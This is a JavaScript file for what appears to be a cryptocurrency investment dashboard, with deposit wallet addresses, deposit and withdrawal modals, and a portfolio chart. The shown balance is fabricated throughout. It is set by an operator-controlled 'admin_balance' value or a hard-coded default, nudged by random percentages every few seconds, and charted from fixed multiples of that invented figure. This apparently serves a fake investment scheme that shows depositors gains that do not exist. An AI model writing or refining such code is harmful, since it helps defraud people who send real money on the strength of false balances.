document.addEventListener('DOMContentLoaded', () => {
    let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 1000.00;
    
    // Add your addresses inside these quotes
    let walletAddresses = {
        'USDT (TRC20)': localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb",
        'Bitcoin (BTC Mainnet)': "1BitcoinWalletAddressGoesHere",
        'Ethereum (ETH ERC20)': "0xEthereumWalletAddressGoesHere"
    };

    function updateBalanceDisplay() {
        const display = document.getElementById('balance-display');
        if (display) {
            display.innerText = '$' + currentBalance.toFixed(2);
        }
    }
    updateBalanceDisplay();

    // --- BUTTON MODAL TRIGGERS ---
    window.triggerDepositModal = function() {
        const modal = document.getElementById('depositModal');
        if (modal) modal.style.display = 'flex';
    };

    window.closeDepositModal = function() {
        const modal = document.getElementById('depositModal');
        if (modal) modal.style.display = 'none';
    };

    window.triggerWithdrawalModal = function() {
        const modal = document.getElementById('withdrawModal');
        if (modal) modal.style.display = 'flex';
    };

    window.closeWithdrawModal = function() {
        const modal = document.getElementById('withdrawModal');
        if (modal) modal.style.display = 'none';
    };

    // --- COIN SWAPPING ENGINE ---
    window.switchCryptoNetwork = function(networkName) {
        const addressBox = document.getElementById('walletAddressBox');
        if (addressBox && walletAddresses[networkName]) {
            addressBox.innerText = walletAddresses[networkName];
        }

        const networks = [
            { id: 'coin-usdt', textId: null, checkId: 'check-usdt', name: 'USDT (TRC20)' },
            { id: 'coin-btc', textId: 'text-btc', checkId: 'check-btc', name: 'Bitcoin (BTC Mainnet)' },
            { id: 'coin-eth', textId: 'text-eth', checkId: 'check-eth', name: 'Ethereum (ETH ERC20)' }
        ];

        networks.forEach(item => {
            const panel = document.getElementById(item.id);
            const check = document.getElementById(item.checkId);
            const textSpan = item.textId ? document.getElementById(item.textId) : null;
            
            if (panel && check) {
                if (item.name === networkName) {
                    panel.style.border = '2px solid #10b981';
                    check.style.display = 'block';
                    if (textSpan) textSpan.style.color = '#10b981';
                } else {
                    panel.style.border = '1px solid #334155';
                    check.style.display = 'none';
                    if (textSpan) textSpan.style.color = '#94a3b8';
                }
            }
        });
    };

    // --- PORTFOLIO CHART GENERATOR ---
    const chartElement = document.getElementById('LivePerformanceChart');
    if (!chartElement) return;
    const ctx = chartElement.getContext('2d');

    const greenColor = 'rgba(16, 185, 129, 1)';
    const greenGradientStart = 'rgba(16, 185, 129, 0.24)';
    const redColor = 'rgba(239, 68, 68, 1)';
    const redGradientStart = 'rgba(239, 68, 68, 0.24)';

    function getChartGradient(colorStart) {
        let gradient = ctx.createLinearGradient(0, 0, 0, 300);
        gradient.addColorStop(0, colorStart);
        gradient.addColorStop(1, 'rgba(0, 0, 0, 0.0)');
        return gradient;
    }

    const liveChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
            datasets: [{
                label: 'Portfolio Value (USDT)',
                data: [currentBalance * 0.992, currentBalance * 0.995, currentBalance * 0.991, currentBalance * 0.997, currentBalance * 0.994, currentBalance],
                borderColor: greenColor,
                borderWidth: 3,
                fill: true,
                backgroundColor: getChartGradient(greenGradientStart),
                tension: 0.4
            }]
        },
        options: {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false } }
        }
    });

    // --- BACKGROUND AUTOMATION REFRESH ---
    setInterval(() => {
        const controlledBalance = parseFloat(localStorage.getItem('admin_balance'));
        const pctChange = (Math.random() * 0.3 - 0.15) / 100;
        const previousBalance = currentBalance;
        
        if (!isNaN(controlledBalance) && controlledBalance !== parseFloat(localStorage.getItem('_last_processed_controlled'))) {
            currentBalance = controlledBalance;
            localStorage.setItem('_last_processed_controlled', controlledBalance);
        } else {
            currentBalance = currentBalance * (1 + pctChange);
        }

        liveChart.data.datasets[0].data = [
            currentBalance * 0.992, currentBalance * 0.995, currentBalance * 0.991, currentBalance * 0.997, currentBalance * 0.994, currentBalance
        ];
        
        updateBalanceDisplay();

        if (currentBalance >= previousBalance) {
            liveChart.data.datasets[0].borderColor = greenColor;
            liveChart.data.datasets[0].backgroundColor = getChartGradient(greenGradientStart);
        } else {
            liveChart.data.datasets[0].borderColor = redColor;
            liveChart.data.datasets[0].backgroundColor = getChartGradient(redGradientStart);
        }

        liveChart.update('none'); 
    }, 3000); 
});
